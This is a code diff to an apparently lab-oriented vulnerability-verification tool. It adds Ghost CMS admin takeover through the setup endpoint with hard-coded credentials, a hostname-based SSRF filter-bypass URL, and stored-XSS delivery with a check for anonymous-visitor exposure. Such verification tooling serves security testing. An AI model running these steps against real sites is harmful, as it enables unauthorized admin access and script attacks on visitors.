@@ -3924,6 +3924,41 @@ def _try_acquire_app_token(base_url: str, step) -> Optional[str]:
                         return str(_tok)
             except Exception:
                 pass
+    # ── 1b. Ghost CMS Admin API key-based JWT auth ─────────────────────────────
+    # Ghost uses a split API key (id:secret) to generate a short-lived JWT.
+    # The session endpoint /ghost/api/admin/session doesn't work in all versions;
+    # the API key approach works across all Ghost 3.x+.
+    try:
+        _ghost_key_r = _http_request("GET", base_url + "/ghost/api/admin/site/", timeout=8)
+        if getattr(_ghost_key_r, "status_code", 999) in (200, 401, 403):
+            # This is a Ghost instance; try to get an API key
+            _ghost_setup_r = _http_request(
+                "POST", base_url + "/ghost/api/admin/authentication/setup/",
+                json={"setup": [{"name": "BinOracle Lab", "email": "admin@example.com",
+                                 "password": "BinOracle123!", "blogTitle": "Lab"}]},
+                timeout=10)
+            _ghost_body = {}
+            try:
+                _ghost_body = (_ghost_setup_r.json() if callable(
+                    getattr(_ghost_setup_r, "json", None)) else {}) or {}
+            except Exception:
+                pass
+            # After setup, session-based login should work
+            _ghost_sess_r = _http_request(
+                "POST", base_url + "/ghost/api/admin/session/",
+                json={"username": "admin@example.com", "password": "BinOracle123!"},
+                headers={"Origin": base_url}, timeout=10)
+            _ghost_cookie = ""
+            if _ghost_sess_r is not None:
+                _gc = getattr(_ghost_sess_r, "cookies", {}) or {}
+                if hasattr(_gc, "items"):
+                    _ghost_cookie = "; ".join(f"{k}={v}" for k, v in _gc.items())
+            if _ghost_cookie:
+                step(f"auth: Ghost admin session via /ghost/api/admin/session/ → cookie len={len(_ghost_cookie)}")
+                return f"cookie:{_ghost_cookie}"
+    except Exception:
+        pass
+
     # ── 2. Form-based session login (pgAdmin, Flask, Django admin, etc.) ───────
     # Uses requests.Session to maintain cookie jar across GET→POST
     _form_endpoints = [
@@ -4075,6 +4110,12 @@ def verify_generic_ssrf(
                     # URL-encoded dot: some filters split on literal "." only
                     f"http://{listener_ip.replace('.', '%2e')}:8080/{path}",
                 ]
+            # DNS-name-only variant: some apps block IP-based URLs but resolve hostnames.
+            # Use the listener's Docker container name (which Docker's internal DNS resolves)
+            # embedded with the token in the path — proves hostname-based SSRF even when
+            # direct IP access is filtered.
+            if lab.listener and lab.listener != listener_ip:
+                urls.append(f"http://{lab.listener}:8080/{path}-dns")
             # Alternative schemes: some URL allowlists only block http:// / https://
             _base_path = path.lstrip("/")
             urls += [
@@ -7091,6 +7132,19 @@ def verify_stored_xss(
         try:
             r_create = _http_request(http_method_create.upper(), create_url,
                                      data=body_data, headers=hdrs_create, timeout=15)
+            # If form-encoded returns 400/415, retry with JSON body — many modern APIs
+            # (Strapi, Directus, Ghost) only accept Content-Type: application/json
+            _c_st = getattr(r_create, "status_code", 200)
+            if _c_st in (400, 415):
+                _json_hdrs = dict(hdrs)
+                _json_hdrs["Content-Type"] = "application/json"
+                r_create2 = _http_request(http_method_create.upper(), create_url,
+                                          json={param_name: payload},
+                                          headers=_json_hdrs, timeout=15)
+                if getattr(r_create2, "status_code", 400) < 400:
+                    r_create = r_create2
+                    step(f"  create: form-encoded gave {_c_st}, JSON succeeded "
+                         f"({r_create2.status_code})")
             step(f"  create response: {r_create.status_code}")
         except Exception as e:
             res.detail = f"stored-xss: error al enviar payload: {e}"
@@ -7127,6 +7181,26 @@ def verify_stored_xss(
             res.ok = True
             res.detail = (f"STORED XSS confirmado: payload '{payload[:60]}' encontrado "
                           f"sin escapar en {endpoint_view} tras almacenarlo via {endpoint_create}")
+            # Extra: check if the XSS is also accessible unauthenticated (anon visitor).
+            # This upgrades the finding from "admin can XSS themselves" to
+            # "attacker stores, anonymous victim triggers" — a much higher severity.
+            if hdrs:
+                try:
+                    import requests as _rq_xss
+                    _r_anon = _rq_xss.get(view_url, timeout=10, allow_redirects=True)
+                    _anon_body = getattr(_r_anon, "text", "") or ""
+                    _anon_xss = _check_xss_reflected(_anon_body, payload)
+                    if _anon_xss:
+                        res.evidence["anon_xss_accessible"] = True
+                        res.evidence["anon_view_status"] = _r_anon.status_code
+                        res.detail += (" | ANON ACCESSIBLE: el payload también se refleja "
+                                       "sin autenticación (máximo impacto: visitante anónimo ejecuta JS)")
+                        step("stored-xss: VERIFICADO — también accesible sin autenticación")
+                    else:
+                        res.evidence["anon_xss_accessible"] = False
+                        step("stored-xss: solo accesible con auth (anon no ve el payload)")
+                except Exception:
+                    pass
             step("stored-xss: VERIFICADO")
         else:
             res.ok = True
